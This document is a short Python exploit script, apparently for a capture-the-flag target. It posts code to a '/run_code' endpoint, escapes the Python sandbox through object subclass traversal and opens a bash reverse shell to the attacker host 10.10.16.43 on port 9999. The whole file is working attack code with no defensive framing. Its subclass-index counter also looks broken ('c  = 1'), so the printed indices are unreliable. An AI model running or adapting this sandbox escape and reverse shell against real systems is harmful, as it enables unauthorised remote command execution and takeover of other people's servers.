import requests,re

burp0_url = "http://10.10.11.62:5000/run_code"
cmd = 'bash -c "bash -i >& /dev/tcp/10.10.16.43/9999 0>&1"'

code = '''
x = f"{(''.__class__.__mro__[1].__subclasses__())}"
#print(x)
c = 0
for i in x.split(','):
    if 'process' in i:
        print(i)
        print(c)
    c  = 1

print('output:')
print(''.__class__.mro()[1].__subclasses__()[317]('{cmd}',shell=True,stdout=-1). communicate()[0].strip())
'''.replace('{cmd}',cmd)

burp0_data = {"code": code}

text = requests.post(burp0_url, data=burp0_data, proxies={'http':'http://localhost:8080'}).text.split('output:')[1].replace('\\n','\n').replace('\\','')

matches = re.findall(r"b'(.+?)'", text, re.DOTALL)

if matches:
    extracted_text = matches[0] # Split by new lines
    print(extracted_text)